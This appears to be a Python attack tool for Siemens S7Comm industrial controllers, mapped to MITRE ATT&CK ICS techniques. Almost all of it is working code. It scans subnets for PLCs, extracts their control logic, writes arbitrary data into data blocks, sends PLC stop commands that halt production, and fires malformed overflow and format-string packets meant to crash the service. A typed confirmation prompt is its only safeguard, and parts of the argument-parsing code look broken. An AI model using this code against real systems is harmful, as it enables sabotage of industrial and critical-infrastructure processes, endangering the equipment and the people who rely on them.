#!/usr/bin/env python3
"""
s7comm_exploit.py
Siemens S7Comm Protocol Exploitation Framework
Advanced security testing toolkit for Siemens S7Comm industrial control systems

DISCLAIMER:
FOR AUTHORIZED SECURITY TESTING AND RESEARCH ONLY.
Unauthorized use is strictly prohibited and may violate laws.

Author: Ridpath
MITRE ATT&CK Mapping: T0801-T0880 (ICS Protocol Exploitation)
"""

import argparse
import logging
import sys
import struct
import time
from typing import Optional, Dict, Any, List, Tuple
import snap7
from snap7.util import *
from snap7.types import *
import socket
import ipaddress
import json
import concurrent.futures
import argcomplete
import random
import binascii

class S7CommBufferOverflowExploiter:
    """S7Comm-specific buffer overflow exploitation techniques"""
    
    def __init__(self, target_ip: str, port: int = 102):
        self.target_ip = target_ip
        self.port = port
        self.logger = logging.getLogger('S7BufferOverflow')
        
    @staticmethod
    def generate_s7comm_overflow_packets() -> List[bytes]:
        """Generate S7Comm-specific buffer overflow test patterns"""
        packets = []
        
        # S7Comm header structure
        base_header = b'\x03\x00\x00'  # TPKT
        base_header += b'\x16\x11\xe0\x00\x00\x00\x01\x00'  # S7Comm base
        
        # Various overflow patterns targeting S7Comm parsers
        patterns = [
            # Parameter section overflow
            b'\x00\x00\x00\x00' + b'A' * 1000,
            # Data section overflow with format string
            b'\x00\x00' + b'%s%s%s%s' * 50,
            # Integer overflow in length fields
            b'\xff\xff\xff\xff' + b'B' * 500,
            # Unicode overflow
            b'\x00\x00' + b'\x41\x00' * 200,
            # Nested structure overflow
            b'\x00\x01' + struct.pack('>H', 0xFFFF) + b'C' * 800,
            # S7Comm Plus specific overflow attempts
            b'\x72\x01' + b'\x00' * 4 + struct.pack('>I', 0xFFFFFFFF) + b'D' * 1000
        ]
        
        for pattern in patterns:
            packet = base_header + struct.pack('>H', len(pattern) + 4) + pattern
            packets.append(packet)
            
        return packets
    
    def test_buffer_overflow_vulnerabilities(self) -> Dict[str, Any]:
        """
        Test for S7Comm buffer overflow vulnerabilities
        
        Returns:
            Dictionary containing test results and vulnerability assessment
        """
        results = {
            'target': f"{self.target_ip}:{self.port}",
            'tests_performed': 0,
            'vulnerabilities_found': [],
            'mitre_mappings': [],
            'responses': []
        }
        
        packets = self.generate_s7comm_overflow_packets()
        
        for i, packet in enumerate(packets):
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
                    sock.settimeout(3.0)
                    sock.connect((self.target_ip, self.port))
                    sock.send(packet)
                    
                    response = sock.recv(1024)
                    results['responses'].append({
                        'packet_id': i,
                        'response_length': len(response),
                        'response_hex': binascii.hexlify(response).decode()[:100]
                    })
                    
                    # Analyze response for potential vulnerability indicators
                    if len(response) == 0:
                        results['vulnerabilities_found'].append(
                            f"Potential DoS vulnerability detected with packet {i}"
                        )
                        results['mitre_mappings'].append('T0814 - Unauthorized Command Message')
                    
            except socket.timeout:
                results['vulnerabilities_found'].append(
                    f"Service timeout with packet {i} - potential DoS"
                )
                results['mitre_mappings'].append('T0814 - Unauthorized Command Message')
            except ConnectionResetError:
                results['vulnerabilities_found'].append(
                    f"Connection reset with packet {i} - potential crash"
                )
                results['mitre_mappings'].append('T0814 - Unauthorized Command Message')
            except Exception as e:
                results['responses'].append({
                    'packet_id': i,
                    'error': str(e)
                })
            
            results['tests_performed'] += 1
            time.sleep(0.1)  # Rate limiting
        
        return results

class S7CommExploiter:
    def __init__(self, target_ip: str, rack: int = 0, slot: int = 1, port: int = 102):
        self.target_ip: str = target_ip
        self.rack: int = rack
        self.slot: int = slot
        self.port: int = port
        self.client: Optional[snap7.client.Client] = None
        self.overflow_tester = S7CommBufferOverflowExploiter(target_ip, port)
        self.setup_logging()
        
    def setup_logging(self) -> None:
        """Configure comprehensive logging for government testing"""
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - S7COMM_EXPLOITATION - %(levelname)s - [%(name)s] - %(message)s',
            handlers=[
                logging.FileHandler('s7comm_security_test.log', encoding='utf-8'),
                logging.StreamHandler(sys.stdout)
            ]
        )
        self.logger: logging.Logger = logging.getLogger('S7CommExploiter')
    
    def connect(self) -> bool:
        """Establish secure connection to Siemens PLC"""
        try:
            self.logger.info(f"Establishing connection to Siemens PLC at {self.target_ip}:{self.port}")
            self.client = snap7.client.Client()
            self.client.set_connection_type(0x02)  # PG connection for full access
            self.client.connect(self.target_ip, self.rack, self.slot, self.port)
            
            if self.client.get_connected():
                plc_info = self.client.get_cpu_info()
                self.logger.info(f"Successfully connected to PLC: {plc_info.ModuleTypeName}")
                self.logger.info(f"PLC Serial: {plc_info.SerialNumber} | AS: {plc_info.ASName}")
                
                # MITRE ATT&CK ICS Mapping
                self.logger.warning("MITRE ATT&CK: T0801 - Network Service Scanning")
                self.logger.warning("MITRE ATT&CK: T0803 - Program Download")
                return True
            else:
                self.logger.error("PLC connection failed - check network connectivity and credentials")
                return False
                
        except Exception as e:
            self.logger.error(f"Connection failed: {str(e)}")
            return False
    
    def disconnect(self) -> None:
        """Safely terminate PLC connection"""
        if self.client:
            try:
                self.client.disconnect()
                self.logger.info("PLC connection terminated securely")
            except Exception as e:
                self.logger.error(f"Disconnection error: {str(e)}")
    
    def get_plc_info(self) -> Dict[str, Any]:
        """Retrieve comprehensive PLC information with security assessment"""
        info: Dict[str, Any] = {}
        try:
            cpu_info = self.client.get_cpu_info()
            info = {
                'module_type': cpu_info.ModuleTypeName,
                'serial_number': cpu_info.SerialNumber,
                'as_name': cpu_info.ASName,
                'module_name': cpu_info.ModuleName,
                'copyright': cpu_info.Copyright,
                'version': cpu_info.Version,
                'security_assessment': {},
                'mitre_mappings': ['T0802 - Determine Firmware Version']
            }
            
            # Enhanced fingerprinting for security assessment
            if "S7-1200" in info['module_type']:
                info['fingerprint'] = "S7-1200 series"
                info['security_assessment']['risk_level'] = "MEDIUM"
            elif "S7-300" in info['module_type']:
                info['fingerprint'] = "S7-300 series" 
                info['security_assessment']['risk_level'] = "MEDIUM"
            elif "S7-1500" in info['module_type']:
                info['fingerprint'] = "S7-1500 series"
                info['security_assessment']['risk_level'] = "LOW"
            else:
                info['fingerprint'] = "Unknown/Other series"
                info['security_assessment']['risk_level'] = "UNKNOWN"
            
            self.logger.info(f"PLC Security Assessment: {info['security_assessment']['risk_level']}")
            self.logger.warning(f"MITRE ATT&CK: T0802 - Determine Firmware Version")
            
        except Exception as e:
            self.logger.error(f"PLC information retrieval failed: {str(e)}")
        return info
    
    def upload_plc_logic(self, block_type: int, block_number: int, output_file: str) -> Dict[str, Any]:
        """
        Upload PLC logic blocks for security analysis
        
        Returns:
            Dictionary containing operation results and security metadata
        """
        result = {'success': False, 'mitre_mappings': ['T0803 - Program Download']}
        try:
            self.logger.warning(f"Uploading PLC logic block - Type: {hex(block_type)}, Number: {block_number}")
            block_data: bytes = self.client.upload(block_type, block_number)
            
            with open(output_file, 'wb') as f:
                f.write(block_data)
            
            result.update({
                'success': True,
                'bytes_written': len(block_data),
                'file_path': output_file,
                'security_implication': 'Logic extraction successful'
            })
            
            self.logger.warning("MITRE ATT&CK: T0803 - Program Download")
            self.logger.info(f"PLC logic block saved: {output_file} ({len(block_data)} bytes)")
            
        except Exception as e:
            error_msg = f"PLC logic upload failed: {str(e)}"
            self.logger.error(error_msg)
            result['error'] = error_msg
            
        return result
    
    def read_data_block(self, db_number: int, start_offset: int, size: int) -> Dict[str, Any]:
        """
        Read data from Data Block with security context
        
        Returns:
            Dictionary containing data and security metadata
        """
        result = {'success': False, 'mitre_mappings': ['T0805 - Program Upload']}
        try:
            data: bytes = self.client.read_area(areas['DB'], db_number, start_offset, size)
            result.update({
                'success': True,
                'data_hex': data.hex(),
                'data_length': len(data),
                'db_number': db_number,
                'offset': start_offset,
                'security_note': 'Data block read successful'
            })
            self.logger.info(f"Read {len(data)} bytes from DB{db_number} at offset {start_offset}")
            
        except Exception as e:
            error_msg = f"Data block read failed: {str(e)}"
            self.logger.error(error_msg)
            result['error'] = error_msg
            
        return result
    
    def write_data_block(self, db_number: int, start_offset: int, data: bytes) -> Dict[str, Any]:
        """
        Write data to Data Block with security warnings
        
        Returns:
            Dictionary containing operation results
        """
        result = {'success': False, 'mitre_mappings': ['T0823 - Modify Control Logic']}
        try:
            self.client.write_area(areas['DB'], db_number, start_offset, data)
            result.update({
                'success': True,
                'bytes_written': len(data),
                'security_warning': 'Control logic modification performed',
                'risk_level': 'HIGH'
            })
            self.logger.warning(f"Modified DB{db_number} at offset {start_offset} - {len(data)} bytes")
            self.logger.warning("MITRE ATT&CK: T0823 - Modify Control Logic")
            
        except Exception as e:
            error_msg = f"Data block write failed: {str(e)}"
            self.logger.error(error_msg)
            result['error'] = error_msg
            
        return result
    
    def plc_control(self, action: str) -> Dict[str, Any]:
        """
        Control PLC operational state with security impact assessment
        
        Returns:
            Dictionary containing operation results and impact assessment
        """
        result = {'success': False, 'mitre_mappings': ['T0825 - Denial of Control']}
        
        if action not in ['start', 'stop']:
            result['error'] = f"Invalid control action: {action}"
            return result
            
        try:
            if action == 'stop':
                self.client.plc_stop()
                result.update({
                    'success': True,
                    'impact': 'PRODUCTION_HALT',
                    'risk_level': 'CRITICAL',
                    'security_warning': 'PLC STOP command executed - Production impacted'
                })
                self.logger.critical("PLC STOP COMMAND EXECUTED - PRODUCTION HALT")
            else:
                self.client.plc_start()
                result.update({
                    'success': True,
                    'impact': 'PRODUCTION_RESTART',
                    'risk_level': 'MEDIUM'
                })
                self.logger.warning("PLC START command executed")
                
            self.logger.warning(f"MITRE ATT&CK: T0825 - Denial of Control")
            
        except Exception as e:
            error_msg = f"PLC control failed: {str(e)}"
            self.logger.error(error_msg)
            result['error'] = error_msg
            
        return result
    
    def scan_blocks(self) -> Dict[str, Any]:
        """
        Comprehensive block scanning with security analysis
        
        Returns:
            Dictionary containing block information and security assessment
        """
        result = {
            'blocks_found': {},
            'security_analysis': {},
            'mitre_mappings': ['T0808 - Service Stop', 'T0809 - Service Discovery']
        }
        
        try:
            block_list = self.client.list_blocks()
            
            # Enhanced block analysis
            block_types = {
                'OB': 'Organization Blocks (Program Logic)',
                'DB': 'Data Blocks (Process Data)', 
                'FC': 'Functions (Code Modules)',
                'FB': 'Function Blocks (Encapsulated Logic)',
                'SDB': 'System Data Blocks (Configuration)'
            }
            
            for block_type, numbers in block_list.items():
                if block_type in block_types:
                    result['blocks_found'][block_type] = {
                        'count': len(numbers),
                        'blocks': numbers,
                        'description': block_types[block_type]
                    }
            
            # Security impact analysis
            total_blocks = sum(len(blocks) for blocks in block_list.values())
            result['security_analysis'] = {
                'total_blocks': total_blocks,
                'risk_assessment': 'HIGH' if total_blocks > 50 else 'MEDIUM',
                'critical_blocks_present': 'OB1' in str(block_list.get('OB', []))
            }
            
            self.logger.info(f"Block scan completed: {total_blocks} blocks found")
            
        except Exception as e:
            self.logger.error(f"Block scan failed: {str(e)}")
            result['error'] = str(e)
            
        return result
    
    def comprehensive_reconnaissance(self) -> Dict[str, Any]:
        """
        Perform comprehensive PLC reconnaissance with security assessment
        
        Returns:
            Dictionary containing all reconnaissance data and security analysis
        """
        recon_data = {
            'plc_info': {},
            'blocks': {},
            'security_assessment': {},
            'mitre_mappings': [
                'T0801 - Network Service Scanning',
                'T0802 - Determine Firmware Version', 
                'T0808 - Service Stop',
                'T0809 - Service Discovery'
            ]
        }
        
        self.logger.info("Initiating comprehensive PLC security reconnaissance")
        
        # Enhanced information gathering
        recon_data['plc_info'] = self.get_plc_info()
        recon_data['blocks'] = self.scan_blocks()
        
        # Security assessment
        try:
            plc_status = self.client.get_plc_status()
            recon_data['plc_status'] = plc_status
            recon_data['security_assessment']['operational_status'] = plc_status
            recon_data['security_assessment']['assessment_time'] = time.time()
            
            # Risk scoring
            risk_score = 0
            if "stop" in plc_status.lower():
                risk_score += 10
            if recon_data['plc_info'].get('security_assessment', {}).get('risk_level') == 'HIGH':
                risk_score += 8
            if recon_data['blocks'].get('security_analysis', {}).get('critical_blocks_present'):
                risk_score += 7
                
            recon_data['security_assessment']['risk_score'] = risk_score
            recon_data['security_assessment']['risk_level'] = 'HIGH' if risk_score > 15 else 'MEDIUM'
            
        except Exception as e:
            self.logger.error(f"PLC status check failed: {str(e)}")
            recon_data['plc_status'] = 'UNKNOWN'
        
        return recon_data

    def perform_buffer_overflow_test(self) -> Dict[str, Any]:
        """
        Execute comprehensive buffer overflow testing
        
        Returns:
            Dictionary containing test results and vulnerability assessment
        """
        self.logger.warning("Initiating S7Comm buffer overflow vulnerability testing")
        self.logger.warning("MITRE ATT&CK: T0814 - Unauthorized Command Message")
        
        results = self.overflow_tester.test_buffer_overflow_vulnerabilities()
        results['mitre_mappings'] = ['T0814 - Unauthorized Command Message', 'T0833 - Exploitation for DoS']
        
        return results

    @staticmethod
    def is_s7comm_responsive(ip: str, port: int = 102, timeout: float = 2.0) -> bool:
        """
        Enhanced S7Comm service detection with protocol validation
        
        Returns:
            bool: True if S7Comm service is responsive and valid
        """
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
                sock.settimeout(timeout)
                sock.connect((ip, port))
                
                # Enhanced S7Comm setup communication request
                setup_comm = b'\x03\x00\x00\x16\x11\xe0\x00\x00\x00\x01\x00\xc1\x02\x01\x00\xc2\x02\x01\x02\xc0\x01\x09'
                sock.send(setup_comm)
                response = sock.recv(1024)
                
                # Validate S7Comm response
                if (response and len(response) >= 27 and 
                    response[2:4] == b'\x00\x1b' and 
                    response[5] == 0xd0):
                    return True
                    
        except Exception as e:
            logging.debug(f"S7Comm detection failed for {ip}:{port} - {str(e)}")
            
        return False

    def scan_subnet(self, subnet: str, port: int = 102, max_workers: int = 50) -> Dict[str, Any]:
        """
        Enhanced subnet scanning with security context
        
        Returns:
            Dictionary containing scan results and security assessment
        """
        results = {
            'subnet': subnet,
            'port': port,
            'responsive_hosts': [],
            'scan_metadata': {},
            'security_context': {
                'mitre_mappings': ['T0801 - Network Service Scanning'],
                'purpose': 'Authorized security assessment'
            }
        }
        
        network = ipaddress.IPv4Network(subnet, strict=False)
        total_hosts = network.num_addresses - 2  # Exclude network and broadcast
        
        self.logger.info(f"Initiating S7Comm security scan: {subnet} ({total_hosts} hosts)")
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
            future_to_ip = {
                executor.submit(self.is_s7comm_responsive, str(ip), port): str(ip) 
                for ip in network.hosts()
            }
            
            for future in concurrent.futures.as_completed(future_to_ip):
                ip = future_to_ip[future]
                try:
                    if future.result():
                        results['responsive_hosts'].append(ip)
                        self.logger.warning(f"S7Comm device identified: {ip}:{port}")
                except Exception as e:
                    logging.debug(f"Scan error for {ip}: {str(e)}")
        
        results['scan_metadata'] = {
            'total_scanned': total_hosts,
            'responsive_count': len(results['responsive_hosts']),
            'completion_time': time.time(),
            'risk_assessment': 'HIGH' if len(results['responsive_hosts']) > 0 else 'LOW'
        }
        
        self.logger.warning(f"Scan completed: {len(results['responsive_hosts'])} S7Comm devices found")
        
        return results

def validate_ip(ip: str) -> str:
    """Enhanced IP address validation"""
    try:
        return str(ipaddress.ip_address(ip))
    except ValueError:
        raise argparse.ArgumentTypeError(f"Invalid IP address format: {ip}")

def validate_subnet(subnet: str) -> str:
    """Enhanced subnet validation with security context"""
    try:
        network = ipaddress.IPv4Network(subnet, strict=False)
        if network.prefixlen < 16:
            logging.warning("Large subnet scan detected - this may generate significant network traffic")
        return subnet
    except ValueError:
        raise argparse.ArgumentTypeError(f"Invalid subnet format: {subnet}")

def parse_hex_data(hex_str: str) -> bytes:
    """
    Enhanced hex data parsing with comprehensive error handling
    
    Raises:
        argparse.ArgumentTypeError: Detailed error messages for various hex format issues
    """
    if not hex_str:
        raise argparse.ArgumentTypeError("Hex data cannot be empty")
    
    # Clean the input
    cleaned = hex_str.strip().replace(" ", "").replace("\n", "").replace("\t", "").replace(":", "")
    
    if not cleaned:
        raise argparse.ArgumentTypeError("Hex data contains only whitespace")
    
    # Validate hex characters
    if not all(c in '0123456789abcdefABCDEF' for c in cleaned):
        invalid_chars = set(c for c in cleaned if c not in '0123456789abcdefABCDEF')
        raise argparse.ArgumentTypeError(f"Invalid hex characters detected: {', '.join(invalid_chars)}")
    
    # Validate length
    if len(cleaned) % 2 != 0:
        raise argparse.ArgumentTypeError(
            f"Hex string must have even number of characters. Got {len(cleaned)} characters. "
            f"Did you forget a nibble? Input: {hex_str[:50]}{'...' if len(hex_str) > 50 else ''}"
        )
    
    try:
        return bytes.fromhex(cleaned)
    except ValueError as e:
        raise argparse.ArgumentTypeError(f"Hex parsing failed: {str(e)}. Input: {hex_str[:100]}")

def main() -> None:
    """Main execution function with enhanced security controls"""
    parser = argparse.ArgumentParser(
        description='Siemens S7Comm Security Testing Framework - GOVERNMENT AUTHORIZED USE ONLY',
        epilog='STRICT COMPLIANCE WITH AUTHORIZATION REQUIREMENTS MANDATORY',
        formatter_class=argparse.RawDescriptionHelpFormatter
    )
    
    subparsers = parser.add_subparsers(dest='command', help='Security testing commands', required=True)
    
    # Enhanced command definitions with security context
    commands = {
        'info': 'Get comprehensive PLC information and security assessment',
        'upload': 'Upload PLC logic blocks for security analysis',
        'read-db': 'Read Data Block contents with security context',
        'write-db': 'Write Data Block contents (HIGH RISK)',
        'control': 'Control PLC operational state (CRITICAL RISK)',
        'recon': 'Comprehensive security reconnaissance',
        'scan': 'Network scanning for S7Comm devices',
        'buffer-overflow': 'Buffer overflow vulnerability testing (ADVANCED)'
    }
    
    for cmd, help_text in commands.items():
        subparsers.add_parser(cmd, help=help_text)
    
    # Enhanced argument definitions
    upload_parser = subparsers.add_parser('upload', help=commands['upload'])
    upload_parser.add_argument('block_type', type=lambda x: int(x, 0), 
                              help='Block type in hex (0x08 for OB, 0x0A for DB)')
    upload_parser.add_argument('block_number', type=int, help='Block number to upload')
    upload_parser.add_argument('output_file', help='Output file path for block data')
    
    read_db_parser = subparsers.add_parser('read-db', help=commands['read-db'])
    read_db_parser.add_argument('db_number', type=int, help='Data Block number')
    read_db_parser.add_argument('offset', type=int, help='Starting byte offset')
    read_db_parser.add_argument('size', type=int, help='Number of bytes to read')
    
    write_db_parser = subparsers.add_parser('write-db', help=commands['write-db'])
    write_db_parser.add_argument('db_number', type=int, help='Data Block number')
    write_db_parser.add_argument('offset', type=int, help='Starting byte offset')
    write_db_parser.add_argument('data', type=parse_hex_data, 
                                help='Data to write as hex string (space-separated bytes or continuous hex)')
    
    control_parser = subparsers.add_parser('control', help=commands['control'])
    control_parser.add_argument('action', choices=['stop', 'start'], help='PLC control action')
    
    scan_parser = subparsers.add_parser('scan', help=commands['scan'])
    scan_parser.add_argument('subnet', type=validate_subnet, 
                            help='Subnet to scan (e.g., 192.168.1.0/24)')
    scan_parser.add_argument('--port', type=int, default=102, 
                            help='S7Comm port (default: 102)')
    scan_parser.add_argument('--max-workers', type=int, default=50,
                            help='Maximum concurrent scans (default: 50)')
    
    # Common arguments for target-specific commands
    target_commands = ['info', 'upload', 'read-db', 'write-db', 'control', 'recon', 'buffer-overflow']
    for cmd in target_commands:
        parser_obj = subparsers.parsers[cmd]
        parser_obj.add_argument('target', type=validate_ip, help='Target PLC IP address')
        parser_obj.add_argument('--rack', type=int, default=0, help='Rack number (default: 0)')
        parser_obj.add_argument('--slot', type=int, default=1, help='Slot number (default: 1)')
        parser_obj.add_argument('--port', type=int, default=102, help='S7Comm port (default: 102)')
    
    # Global options
    parser.add_argument('--output-format', choices=['text', 'json'], default='text',
                       help='Output format (default: text)')
    parser.add_argument('--log-level', choices=['DEBUG', 'INFO', 'WARNING', 'ERROR'], 
                       default='INFO', help='Logging level (default: INFO)')
    
    argcomplete.autocomplete(parser)
    args = parser.parse_args()
    
    # Enhanced authorization and warning system
    print("\n" + "="*80)
    print("S7COMM SECURITY TESTING FRAMEWORK - GOVERNMENT LAB USE ONLY")
    print("="*80)
    print("WARNING: This tool performs intrusive security testing operations.")
    print("Unauthorized use is strictly prohibited and may:")
    print("  - Cause production system disruptions")
    print("  - Violate federal and international laws") 
    print("  - Compromise critical infrastructure")
    print("="*80)
    
    confirmation = input("\nConfirm you have proper government authorization (YES/NO): ")
    if confirmation.upper() != 'YES':
        print("Operation cancelled - authorization not confirmed")
        sys.exit(1)
    
    # Set logging level
    logging.getLogger().setLevel(getattr(logging, args.log_level))
    
    if args.command == 'scan':
        exploiter = S7CommExploiter('0.0.0.0')
        results = exploiter.scan_subnet(args.subnet, args.port, args.max_workers)
        
        if args.output_format == 'json':
            print(json.dumps(results, indent=2, default=str))
        else:
            print(f"\nScan Results for {args.subnet}:")
            print(f"Responsive S7Comm devices: {len(results['responsive_hosts'])}")
            for ip in results['responsive_hosts']:
                print(f"  - {ip}:{args.port}")
            print(f"\nSecurity Assessment: {results['scan_metadata']['risk_assessment']}")
        return
    
    # Initialize exploiter for target-specific commands
    exploiter = S7CommExploiter(args.target, args.rack, args.slot, args.port)
    
    if not exploiter.connect():
        sys.exit(1)
    
    try:
        if args.command == 'info':
            result = exploiter.get_plc_info()
            
        elif args.command == 'upload':
            result = exploiter.upload_plc_logic(args.block_type, args.block_number, args.output_file)
            
        elif args.command == 'read-db':
            result = exploiter.read_data_block(args.db_number, args.offset, args.size)
            
        elif args.command == 'write-db':
            # Enhanced warning for write operations
            print(f"\nWARNING: Writing to DB{args.db_number} at offset {args.offset}")
            print(f"Data: {args.data.hex()}")
            confirm = input("Confirm write operation (YES/NO): ")
            if confirm.upper() != 'YES':
                print("Write operation cancelled")
                return
            result = exploiter.write_data_block(args.db_number, args.offset, args.data)
            
        elif args.command == 'control':
            # Critical operation confirmation
            if args.action == 'stop':
                print("\nCRITICAL WARNING: PLC STOP command will halt industrial processes!")
                confirm = input("Type 'CONFIRM_STOP' to proceed: ")
                if confirm != 'CONFIRM_STOP':
                    print("PLC stop operation cancelled")
                    return
            result = exploiter.plc_control(args.action)
            
        elif args.command == 'recon':
            result = exploiter.comprehensive_reconnaissance()
            
        elif args.command == 'buffer-overflow':
            print("\nWARNING: Buffer overflow testing may cause service disruption")
            confirm = input("Proceed with vulnerability testing (YES/NO): ")
            if confirm.upper() != 'YES':
                print("Buffer overflow testing cancelled")
                return
            result = exploiter.perform_buffer_overflow_test()
        
        # Output results
        if args.output_format == 'json':
            print(json.dumps(result, indent=2, default=str))
        else:
            if args.command == 'info':
                print("\nPLC Security Assessment:")
                for key, value in result.items():
                    print(f"  {key}: {value}")
            else:
                print(f"\nOperation Results:")
                for key, value in result.items():
                    if key not in ['mitre_mappings']:
                        print(f"  {key}: {value}")
                
                if 'mitre_mappings' in result:
                    print(f"\nMITRE ATT&CK Mappings:")
                    for mapping in result['mitre_mappings']:
                        print(f"  - {mapping}")
            
    except Exception as e:
        logging.error(f"Security testing operation failed: {str(e)}")
        if args.output_format == 'json':
            print(json.dumps({'error': str(e)}, indent=2))
    finally:
        exploiter.disconnect()

if __name__ == "__main__":
    main()
